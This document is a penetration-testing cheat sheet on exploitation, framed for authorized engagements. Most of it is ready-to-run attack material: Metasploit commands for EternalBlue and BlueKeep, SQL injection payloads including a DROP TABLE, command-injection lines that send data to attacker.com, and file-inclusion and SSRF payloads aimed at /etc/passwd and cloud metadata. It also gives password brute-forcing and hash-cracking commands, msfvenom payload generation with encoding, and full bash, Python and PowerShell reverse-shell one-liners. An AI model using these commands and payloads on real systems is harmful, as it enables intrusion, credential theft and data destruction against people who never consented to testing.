# Exploitation Techniques

Exploitation involves leveraging identified vulnerabilities to gain unauthorized access, escalate privileges, or achieve other objectives during authorized penetration testing engagements.

---

## Exploitation Framework

```
    EXPLOITATION PROCESS

    1. VULNERABILITY IDENTIFICATION
    +----------------------------------+
    | Scan results, manual testing     |
    | CVE research, exploit databases  |
    +----------------------------------+
              |
              v
    2. EXPLOIT RESEARCH
    +----------------------------------+
    | Public exploits (Exploit-DB)     |
    | Metasploit modules               |
    | Custom development               |
    +----------------------------------+
              |
              v
    3. EXPLOIT PREPARATION
    +----------------------------------+
    | Configure payload                |
    | Set parameters                   |
    | Test in lab                      |
    +----------------------------------+
              |
              v
    4. EXPLOITATION
    +----------------------------------+
    | Execute exploit                  |
    | Gain access                      |
    | Establish foothold               |
    +----------------------------------+
              |
              v
    5. POST-EXPLOITATION
    +----------------------------------+
    | Maintain access                  |
    | Escalate privileges              |
    | Lateral movement                 |
    +----------------------------------+
```

---

## Vulnerability Categories

### Common Vulnerability Types

| Category | Description | CVSS Impact |
|----------|-------------|-------------|
| Remote Code Execution | Execute arbitrary code | Critical |
| Authentication Bypass | Bypass auth controls | Critical/High |
| SQL Injection | Database manipulation | High/Critical |
| Buffer Overflow | Memory corruption | Critical |
| Command Injection | OS command execution | Critical |
| Deserialization | Object manipulation | High/Critical |
| Path Traversal | File system access | Medium/High |
| SSRF | Internal network access | Medium/High |

### Exploit Sources

| Source | Type | Use Case |
|--------|------|----------|
| Exploit-DB | Public database | Research, PoC |
| Metasploit | Framework modules | Automated exploitation |
| GitHub | PoC code | Research, adaptation |
| Packet Storm | Exploits, tools | Research |
| CVE Details | CVE information | Vulnerability research |

---

## Metasploit Framework

### Basic Usage

```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows smb
search cve:2017-0144

# Use exploit module
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options
show payloads

# Set options
set RHOSTS 192.168.1.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444

# Execute
exploit
```

### Common Exploits

| Module | Target | CVE |
|--------|--------|-----|
| ms17_010_eternalblue | Windows SMB | CVE-2017-0144 |
| ms08_067_netapi | Windows | CVE-2008-4250 |
| apache_mod_cgi_bash | Shellshock | CVE-2014-6271 |
| drupalgeddon2 | Drupal | CVE-2018-7600 |
| tomcat_mgr_upload | Tomcat | Multiple |
| jenkins_script_console | Jenkins | Multiple |

### Payload Types

| Payload | Description | Use Case |
|---------|-------------|----------|
| reverse_tcp | Reverse shell | Outbound connection |
| bind_tcp | Bind shell | Direct connection |
| meterpreter | Advanced shell | Full post-exploitation |
| shell | Basic shell | Simple access |
| exec | Command execution | Single command |

---

## Web Application Exploitation

### SQL Injection

```bash
# Manual testing
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
'; DROP TABLE users--

# SQLMap automation
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
sqlmap -u "http://target.com/page?id=1" --os-shell
```

### Command Injection

```bash
# Basic injection
; id
| id
`id`
$(id)

# Blind injection
; sleep 5
| ping -c 5 attacker.com
; curl http://attacker.com/$(whoami)

# Filter bypass
;i]d
${IFS}id
;$'\x69\x64'
```

### File Inclusion

```bash
# Local File Inclusion (LFI)
../../etc/passwd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
php://filter/convert.base64-encode/resource=index.php

# Remote File Inclusion (RFI)
http://attacker.com/shell.txt
http://attacker.com/shell.txt%00
```

### Server-Side Request Forgery (SSRF)

```bash
# Internal network access
http://127.0.0.1:80
http://localhost:8080
http://192.168.1.1/admin

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/

# Protocol handlers
file:///etc/passwd
gopher://127.0.0.1:25/
dict://127.0.0.1:11211/
```

---

## Network Exploitation

### SMB Exploitation

```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.1
exploit

# PSExec with credentials
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.1
set SMBUser administrator
set SMBPass password
exploit

# SMB Relay
responder -I eth0
ntlmrelayx.py -t 192.168.1.1 -smb2support
```

### Service Exploitation

```bash
# SSH Brute Force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.1
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# FTP Anonymous
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.0/24
run

# RDP BlueKeep
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.1
exploit
```

---

## Password Attacks

### Online Attacks

```bash
# Hydra - SSH
hydra -l admin -P passwords.txt 192.168.1.1 ssh

# Hydra - HTTP POST
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"

# Medusa
medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u admin -p password
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
```

### Offline Attacks

```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT hashes.txt

# Hashcat
hashcat -m 1000 hashes.txt rockyou.txt  # NTLM
hashcat -m 0 hashes.txt rockyou.txt     # MD5
hashcat -m 1800 hashes.txt rockyou.txt  # SHA-512

# Hash identification
hashid '$6$rounds=5000$...'
hash-identifier
```

---

## Payload Generation

### MSFVenom

```bash
# Windows Reverse Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

# Linux Reverse Shell
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf

# Web Payloads
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php

msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 -f war > shell.war

# Encoded payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x64/xor -f exe > shell_encoded.exe
```

### Manual Payloads

```bash
# Bash reverse shell
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

---

## Listener Setup

```bash
# Netcat listener
nc -lvnp 4444

# Metasploit handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j

# Socat encrypted
socat -d -d OPENSSL-LISTEN:4444,cert=cert.pem,verify=0,fork EXEC:/bin/bash
```

---

## Documentation

### Exploitation Log Template

```
EXPLOITATION RECORD

Target: [IP/Hostname]
Date/Time: [Timestamp]
Tester: [Name]

Vulnerability:
- CVE: [CVE ID]
- Service: [Service/Version]
- Description: [Brief description]

Exploit Used:
- Source: [Metasploit/ExploitDB/Custom]
- Module: [Module path]
- Configuration: [Key parameters]

Result:
- Success: [Yes/No]
- Access Gained: [Shell type/User level]
- Evidence: [Screenshot/Log reference]

Post-Exploitation:
[Actions taken after access]

Recommendations:
[Remediation steps]
```

---

## References

- OWASP Testing Guide
- Metasploit Unleashed
- Exploit Database

---

## Document Control

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2024-01-15 | Security Architecture | Initial release |
